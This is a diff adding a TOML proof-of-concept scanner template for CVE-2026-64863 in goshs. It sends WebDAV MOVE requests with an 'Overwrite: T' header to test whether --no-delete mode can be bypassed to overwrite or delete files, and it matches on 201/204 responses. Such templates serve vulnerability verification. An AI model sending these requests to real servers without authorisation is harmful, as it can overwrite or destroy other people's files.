@@ -1,0 +1,49 @@
+[info]
+author = "AVE"
+description = "通过发送 WebDAV MOVE 请求并携带 Overwrite: T 头，验证 goshs 在 --no-delete 模式下是否错误允许文件删除或覆盖操作"
+id = "POC-AVE-2026-0933"
+name = "goshs WebDAV MOVE 安全限制绕过 PoC"
+severity = "critical"
+tags = ["ave-2026-0933"]
+vuln_id = [
+    "CVE-2026-64863",
+    "AVE-2026-0933",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "MOVE"
+path = "/{{BaseURL}}/existing_file.txt"
+protocol = "http"
+
+[poc.requests.headers]
+Destination = "/{{BaseURL}}/moved_file.txt"
+Overwrite = "T"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    204,
+    201,
+]
+type = "status"
+
+[[poc.requests]]
+method = "MOVE"
+path = "/{{BaseURL}}/target.txt"
+protocol = "http"
+
+[poc.requests.headers]
+Destination = "/{{BaseURL}}/deleted_target.txt"
+Overwrite = "T"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "204",
+    "201",
+]
